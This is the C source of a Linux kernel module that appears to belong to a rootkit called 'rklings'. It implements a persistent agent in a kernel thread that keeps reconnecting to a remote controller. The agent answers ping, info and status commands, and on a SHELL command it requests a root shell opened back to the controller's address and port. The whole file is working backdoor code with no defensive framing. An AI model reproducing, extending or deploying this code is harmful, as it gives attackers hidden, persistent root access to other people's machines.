// SPDX-License-Identifier: GPL-2.0
#include <linux/err.h>
#include <linux/errno.h>
#include <linux/jiffies.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/random.h>
#include <linux/socket.h>
#include <linux/string.h>
#include <net/net_namespace.h>

#include "agent.h"
#include "root_shell.h"

static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
			    const struct rk_frame *frame, bool *close_session)
{
	static const unsigned char error_reply[] = "ERR";
	static const unsigned char info_reply[] = "INFO rklings";
	static const unsigned char pong_reply[] = "PONG";
	unsigned char reply[RK_FRAME_MAX];
	struct rk_command command;
	size_t reply_length;
	int error;

	*close_session = false;
	error = rk_command_parse(frame->payload, frame->length, &command);
	if (error)
		return rk_send_frame(socket, error_reply,
				     sizeof(error_reply) - 1);

	switch (command.kind) {
	case RK_COMMAND_PING:
		return rk_send_frame(socket, pong_reply,
				     sizeof(pong_reply) - 1);
	case RK_COMMAND_INFO:
		return rk_send_frame(socket, info_reply,
				     sizeof(info_reply) - 1);
	case RK_COMMAND_STATUS:
		reply_length = scnprintf(reply, sizeof(reply),
					 "STATUS connected=%s",
					 agent->connected ? "true" : "false");
		return rk_send_frame(socket, reply, reply_length);
	case RK_COMMAND_SHELL: {
		struct rk_root_shell_ticket ticket;

		error = rk_root_shell_request(
			agent->shell, agent->peer.sin_addr.s_addr,
			command.shell_port, &ticket);
		if (!error) {
			reply_length = scnprintf(
				reply, sizeof(reply), "OPEN %08x %016llx",
				ticket.request_id,
				(unsigned long long)ticket.cookie);
			return rk_send_frame(socket, reply, reply_length);
		}
		if (error == -EBUSY)
			return rk_send_frame(socket,
					     (const unsigned char *)"ERR busy", 8);
		return rk_send_frame(socket,
				     (const unsigned char *)"ERR shell", 9);
	}
	case RK_COMMAND_SHELL_STATUS: {
		struct rk_root_shell_status shell_status;

		rk_root_shell_snapshot(agent->shell, &shell_status);
		reply_length = scnprintf(
			reply, sizeof(reply), "STATE %08x %s %d",
			shell_status.request_id,
			rk_root_shell_state_name(shell_status.state),
			shell_status.result);
		return rk_send_frame(socket, reply, reply_length);
	}
	case RK_COMMAND_QUIT:
		*close_session = true;
		return 0;
	case RK_COMMAND_INVALID:
	default:
		return -EPROTO;
	}
}

static int rk_agent_serve(struct rk_agent *agent, struct socket *socket)
{
	for (;;) {
		struct rk_frame frame;
		bool close_session;
		int error;

		if (kthread_should_stop())
			return 0;
		error = rk_receive_frame(socket, &frame);
		if (error == -EMSGSIZE) {
			error = rk_send_frame(socket,
					      (const unsigned char *)"ERR", 3);
			if (!error)
				continue;
		}
		if (error)
			return error;
		error = rk_agent_command(agent, socket, &frame, &close_session);
		if (error || close_session)
			return error;
	}
}

static int rk_agent_attempt(struct rk_agent *agent)
{
	struct socket *socket = NULL;
	bool shutdown_here = false;
	int error;

	error = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP,
				 &socket);
	if (error)
		return error;
	if (!socket)
		return -EPROTO;

	mutex_lock(&agent->lock);
	if (agent->stopping) {
		mutex_unlock(&agent->lock);
		sock_release(socket);
		return 0;
	}
	agent->active = socket;
	agent->shutdown_started = false;
	mutex_unlock(&agent->lock);

	error = kernel_connect(socket,
			       (struct sockaddr_unsized *)&agent->peer,
			       sizeof(agent->peer), 0);
	if (error)
		goto close;
	mutex_lock(&agent->lock);
	agent->connected = true;
	agent->retry_delay_ms = agent->retry_base_ms;
	mutex_unlock(&agent->lock);
	error = rk_agent_serve(agent, socket);

close:
	mutex_lock(&agent->lock);
	if (agent->active == socket)
		agent->active = NULL;
	agent->connected = false;
	if (!agent->shutdown_started) {
		agent->shutdown_started = true;
		shutdown_here = true;
	}
	mutex_unlock(&agent->lock);
	if (shutdown_here)
		(void)kernel_sock_shutdown(socket, SHUT_RDWR);
	sock_release(socket);
	return error;
}

static int rk_agent_worker(void *argument)
{
	struct rk_agent *agent = argument;

	while (!kthread_should_stop()) {
		int error;

		error = rk_agent_attempt(agent);
		if (kthread_should_stop())
			break;
		mutex_lock(&agent->lock);
		if (error)
			agent->retry_delay_ms = rk_retry_next(
				agent->retry_delay_ms, agent->retry_base_ms,
				agent->retry_max_ms);
		else
			agent->retry_delay_ms = agent->retry_base_ms;
		mutex_unlock(&agent->lock);
		{
			unsigned int delay = agent->retry_delay_ms;

			delay += get_random_u32_below(delay / 4 + 1);
			(void)wait_event_interruptible_timeout(
				agent->retry_wait, kthread_should_stop(),
				msecs_to_jiffies(delay));
		}
	}
	return 0;
}

int rk_agent_start(struct rk_agent *agent, __be32 peer_address, u16 peer_port,
		   unsigned int retry_base_ms, unsigned int retry_max_ms,
		   struct rk_root_shell *shell)
{
	struct task_struct *task;

	if (!agent || !peer_address || !peer_port || !retry_base_ms ||
	    retry_base_ms > retry_max_ms || retry_max_ms > 5000 || !shell)
		return -EINVAL;
	memset(agent, 0, sizeof(*agent));
	mutex_init(&agent->lock);
	init_waitqueue_head(&agent->retry_wait);
	agent->peer.sin_family = AF_INET;
	agent->peer.sin_addr.s_addr = peer_address;
	agent->peer.sin_port = htons(peer_port);
	agent->retry_base_ms = retry_base_ms;
	agent->retry_max_ms = retry_max_ms;
	agent->retry_delay_ms = retry_base_ms;
	agent->shell = shell;
	agent->initialized = true;
	task = kthread_create(rk_agent_worker, agent, "rkling_agent");
	if (IS_ERR(task)) {
		agent->initialized = false;
		return PTR_ERR(task);
	}
	mutex_lock(&agent->lock);
	agent->task = task;
	mutex_unlock(&agent->lock);
	wake_up_process(task);
	return 0;
}

void rk_agent_stop(struct rk_agent *agent)
{
	struct task_struct *task;

	if (!agent || !READ_ONCE(agent->initialized))
		return;
	mutex_lock(&agent->lock);
	task = agent->task;
	if (!task) {
		mutex_unlock(&agent->lock);
		return;
	}
	agent->stopping = true;
	if (agent->active && !agent->shutdown_started) {
		agent->shutdown_started = true;
		(void)kernel_sock_shutdown(agent->active, SHUT_RDWR);
	}
	mutex_unlock(&agent->lock);
	wake_up_interruptible(&agent->retry_wait);
	(void)kthread_stop(task);
	mutex_lock(&agent->lock);
	agent->task = NULL;
	agent->connected = false;
	mutex_unlock(&agent->lock);
}
